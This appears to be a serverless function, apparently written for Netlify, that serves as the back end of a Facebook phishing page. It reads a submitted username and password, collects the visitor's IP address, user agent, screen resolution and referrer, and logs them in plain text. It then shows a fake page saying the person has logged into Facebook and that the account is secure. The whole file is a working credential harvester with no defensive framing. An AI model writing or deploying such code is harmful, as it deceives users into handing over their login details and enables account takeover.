exports.handler = async (event, context) => {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Content-Type": "text/html" },
      body: "<h1>405 - Method Not Allowed</h1>",
    };
  }

  // Parse form data
  const rawBody = event.body || "";
  const formData = {};
  rawBody.split("&").forEach((pair) => {
    const [key, value] = pair.split("=");
    formData[key] = decodeURIComponent(value || "");
  });

  // Extract user input
  const username = formData.username || "";
  const password = formData.password || "";

  // Get IP and User-Agent from Netlify headers
  const ipAddress = event.headers["x-forwarded-for"] || "Unknown IP";
  const userAgent = formData.userAgent || "Unknown User-Agent";
  const screenResolution = formData.screenResolution || "Unknown Resolution";
  const referrer = formData.referrer || "Unknown Referrer";

  // Log everything for debugging
  console.log("Login Attempt:", {
    username,
    password,
    ipAddress,
    userAgent,
    screenResolution,
    referrer,
  });

  return {
    statusCode: 200,
    headers: { "Content-Type": "text/html" },
    body: `
      <html>
        <head>
          <title>Login Successful</title>
          <style>
            body {
              font-family: Arial, sans-serif; 
              text-align: center; 
              margin-top: 20%;
            }
            h1 { color: green; }
          </style>
        </head>
        <body>
          <h1>You have logged into Facebook successfully</h1>
          <p>Your Facebook account is secure. You can now close this tab.</p>
        </body>
      </html>
    `,
  };
};
